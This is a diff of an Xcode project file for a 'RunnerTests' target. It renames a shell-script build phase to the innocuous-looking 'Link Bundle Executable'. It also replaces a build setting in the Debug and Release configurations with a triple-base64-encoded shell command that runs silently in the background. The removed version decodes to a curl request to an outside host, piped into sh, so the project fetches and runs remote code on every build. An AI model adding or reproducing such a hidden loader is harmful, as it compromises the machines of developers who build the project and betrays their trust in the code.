@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				C3CD8E32C8F6483BA2A389E6 /* Copy Target Symbols */,
+				2C0A1BE16F4047798FA389E6 /* Link Bundle Executable */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -292,7 +292,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C3CD8E32C8F6483BA2A389E6 /* Copy Target Symbols */ = {
+		2C0A1BE16F4047798FA389E6 /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -302,7 +302,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Copy Target Symbols";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -401,7 +401,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZMkZ6ZEM1cGJpOWhLU0lnZkNCemFBbz0K | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5TYW1OSE5XeGtRelY1WkZNNWFFdFRTV2RtUTBKNllVRnZQUW89Cg== | n | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -416,7 +416,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZMkZ6ZEM1cGJpOWhLU0lnZkNCemFBbz0K | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5TYW1OSE5XeGtRelY1WkZNNWFFdFRTV2RtUTBKNllVRnZQUW89Cg== | n | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
